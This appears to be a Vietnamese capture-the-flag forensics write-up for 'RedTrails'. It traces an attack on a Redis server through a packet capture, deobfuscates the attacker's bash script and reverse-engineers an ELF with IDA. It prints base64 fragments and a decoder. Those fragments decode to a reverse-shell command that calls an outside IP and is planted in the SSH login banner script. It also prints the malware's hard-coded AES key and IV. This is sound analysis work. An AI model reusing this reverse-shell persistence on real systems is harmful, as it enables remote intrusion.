# RedTrails
## CHALLENGE DESCRIPTION
Our SOC team detected a suspicious activity on one of our redis instance. Despite the fact it was password protected it seems that the attacker still obtained access to it. We need to put in place a remediation strategy as soon as possible, to do that it's necessary to gather more informations about the attack used. NOTE: flag is composed by three parts.

## Tools use
- WireShark
- Cyberchef 
- IDA

# Analysis
Giải nén file ta được file sau:
```
.
├── RedTrails
│   ├── capture.pcap

```
## capture.pcap
### HTTP protocol
Khi được cho một file pcap, việc đầu tiên sẽ kiểm tra xem file độc hại sẽ đi qua đường internet không bằng giao thức HTTP không 

![image](https://hackmd.io/_uploads/ryPFotVhkx.png)

Nhìn vào 2 gói tin trên ta có thể thấy nạn nhân truy cập và đã nhận được file `VgLy9V0Zxo` 

![image](https://hackmd.io/_uploads/r1kenY4nke.png)

Nội dung của file như sau 

![image](https://hackmd.io/_uploads/rkxwnKN2kl.png)

> Lần đầu nhìn cũng có thể đoán được nó đã bị mã hóa bằng b64 (2 dấu =) và được đảo ngược lại, tuy nhiên sẽ phân tích kỹ hơn theo phong cách không đoán 

Chú ý các dòng cuối, hàm `eval` đang được gọi bằng các ký tự ở ngay phía  trên, chúng dùng các giá trị gán

![image](https://hackmd.io/_uploads/Hyxk6tV3Je.png)

```
HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"
```

Dựng lại đoạn code sau để cho dễ nhìn hơn:

![image](https://hackmd.io/_uploads/S1ze0tE2kg.png)

:::spoiler Đoạn code
```
import os

# Khai báo các biến tương tự Bash
HxJ = "s"
Hc2 = ""
f = "as"
kcE = "pas"
cEf = "ae"
d = "o"
V9z = "6"
P8c = "if"
U = " -d"
Jc = "ef"
N0q = ""
v = "b"
w = "e"
b = "v |"
Tx = "Eds"
xZp = ""
gH4="Ed"
kM0="xSz"
c="ch"
L="4"
rQW=""
fE1="lQ"

# Chuyển đổi câu lệnh Bash thành Python
x = f"{Hc2}{w}{c}{rQW}{d}{HxJ}{w}{b}{Hc2}{v}{xZp}{f}{w}{V9z}{rQW}{L}{U}{xZp}"
print(x)

# Nếu x là một lệnh shell và bạn muốn thực thi nó:
# result = os.popen(x).read()
# print(result)
```
:::

Tương tự với đoạn này

![image](https://hackmd.io/_uploads/BJ7ERKN2kl.png)

Để đỡ mất thời gian, mở Cyberchef để nó decode. Kết quả thu được:

![image](https://hackmd.io/_uploads/HyhF0KN2Je.png)

Tiếp tục đoạn này cũng 1 đoạn code gán giá trị để làm rối 

![image](https://hackmd.io/_uploads/ryoTAFN21g.png)

:::spoiler Đoạn code
```
import base64
import os

# Khai báo các biến giống trong Bash
ABvnz = "ZWNobyAnYmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3R"
QOPjH = "jcC8xMC4xMC4wLjIwMC8xMzM3IDA+JjEiJyA+IC9"
gQIxX = "ldGMvdXBkYXRlLW1vdGQuZC8wMC1oZWFkZXIK"

# Ghép chuỗi và giải mã Base64
encoded_string = ABvnz + QOPjH + gQIxX
decoded_string = base64.b64decode(encoded_string).decode()

# In chuỗi đã giải mã
print(decoded_string)

# Nếu muốn thực thi, bỏ comment dòng dưới (Cẩn thận với mã độc!)clearclear
# os.system(decoded_string)
```
:::

Từ việc giải mã đoạn code trên, ta có thể đoán kịch bản rằng TA đang muốn tạo một reverse shell cho vào file `00-header`, nó sẽ tự động... : ) đọc bên dưới

> 00-header là file được sử dụng để hiển thị thông điệp chào mừng (Message of the Day - MOTD) khi người dùng đăng nhập vào hệ thống qua SSH hoặc terminal. Mục đích của TA là khi có user ssh vào thì shell này sẽ tự động chạy

Tương tự với đoạn code còn lại, ta sẽ lấy được 1 part của flag 

![image](https://hackmd.io/_uploads/rJrIec4n1e.png)

> Việc tạo key vào file ssh nhằm duy trì phiên không bị ngắt và TA có thể quay lại bất cứ khi nào (như là 1 backdoor)

## RESP protocol
Lý do phải kiểm tra vì như mô tả của challange, có hành vi đáng nghi ngờ từ redis nên phải check =))

> Redis Serialization Protocol (RESP) là giao thức tuần tự hóa dữ liệu của Redis, dùng để giao tiếp giữa client và server. RESP đơn giản, nhanh và hỗ trợ nhiều kiểu dữ liệu khác nhau như chuỗi (string), số nguyên (integer), danh sách (array), lỗi (error).

Trace theo luồng, ta sẽ lấy được 1 part nữa của flag

![image](https://hackmd.io/_uploads/SJj_W9V2kx.png)

Theo đó ta sẽ thấy có một gói tin về chứa nội dung 1 loại file đó là file bin, dụa vào header signature file để biết được điều này

![image](https://hackmd.io/_uploads/ByWIM54hke.png)

![image](https://hackmd.io/_uploads/rJw2M5Nn1x.png)

Lấy giá trị và chuyển nó thành file bin để tiếp tục phân tích

```
┌──(kali㉿kali)-[~/Desktop]
└─$ cat a.elf | xxd -r -p > fixed.elf
                                                                             
┌──(kali㉿kali)-[~/Desktop]
└─$ chmod +x fixed.elf
                                                                           
┌──(kali㉿kali)-[~/Desktop]
└─$ file fixed.elf 
fixed.elf: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, stripped
```
## IDA
Dùng IDA bật debug tại hàm DoCommnad sẽ thấy ở dòng 59 đổ xuống 72, nó đang mã hóa dữ liệu bằng thuật toán AES-256-CBC (theo chatgpt :)))

![image](https://hackmd.io/_uploads/SyEoXqNhkl.png)

```
src = "h02B6aVgu09Kzu9QTvTOtgx9oER9WIoz";  // Khóa AES (32 byte)
v27 = "YDP7ECjzuV7sagMN";  // IV (Initialization Vector) (16 byte)
strncpy(v33, "h02B6aVgu09Kzu9QTvTOtgx9oER9WIoz", 0x20u);  // Sao chép khóa vào v33
strncpy(v32, v27, 0x10u);  // Sao chép IV vào v32
```

Quay lại file pcap, vì có file giải mã rồi nên việc gói có chứa đoạn mã hóa sẽ có ở các gói trước hoặc sau

![image](https://hackmd.io/_uploads/B1M4H942Jx.png)

Đem lên Cyberchef và lấy được part cuối của flag.

![image](https://hackmd.io/_uploads/ry8iEqEh1g.png)
